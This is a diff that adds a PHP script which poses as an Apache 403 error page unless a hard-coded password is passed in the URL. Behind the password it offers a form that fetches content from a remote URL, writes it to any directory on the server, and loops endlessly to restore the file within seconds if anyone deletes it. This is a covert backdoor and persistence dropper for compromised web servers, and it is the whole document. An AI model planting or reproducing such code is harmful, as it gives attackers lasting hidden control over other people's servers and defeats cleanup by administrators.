@@ -1,0 +1,75 @@
+<?php
+if (!isset($_GET['pass']) || $_GET['pass'] !== 'Kkjsqdb/QWsljqlxacOQKWPDsqa') {
+    header('HTTP/1.1 403 Forbidden');
+    echo "<html><head>
+    <title>403 Forbidden</title>
+    </head><body>
+    <h1>Forbidden</h1>
+    <p>You don't have permission to access " . htmlspecialchars($_SERVER['REQUEST_URI']) . " on this server.</p>
+    <p>Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>
+    </body></html>";
+    exit;
+}
+
+
+ignore_user_abort(true);
+set_time_limit(0);
+
+
+if (!isset($_POST['submit'])) {
+    echo '
+    <form method="POST">
+        <label>URL Sumber:</label><br>
+        <input type="text" name="url" placeholder="Masukkan URL konten mentah" required><br><br>
+        <label>Nama File:</label><br>
+        <input type="text" name="filename" placeholder="Nama file yang diinginkan" required><br><br>
+        <label>Direktori Target:</label><br>
+        <input type="text" name="directory" placeholder="/path/to/directory" required><br><br>
+        <input type="submit" name="submit" value="Upload and Persist">
+    </form>';
+    exit;
+}
+
+
+$url = $_POST['url'];
+$filename = $_POST['filename'];
+$directory = rtrim($_POST['directory'], '/'); 
+
+
+function download_and_save($url, $directory, $filename) {
+    $content = @file_get_contents($url);
+    if ($content === false) {
+        echo "Gagal mengambil konten dari $url<br>";
+        return false;
+    }
+
+    if (!is_dir($directory)) {
+        mkdir($directory, 0755, true);
+    }
+
+
+    $full_path = $directory . '/' . $filename;
+
+
+    file_put_contents($full_path, $content);
+    echo "File berhasil diunggah ke $full_path<br>";
+    return true;
+}
+
+if (!download_and_save($url, $directory, $filename)) {
+    exit;
+}
+
+
+while (true) {
+    $full_path = $directory . '/' . $filename;
+
+
+    if (!file_exists($full_path)) {
+        download_and_save($url, $directory, $filename);
+    }
+
+
+    sleep(5);
+}
+?>
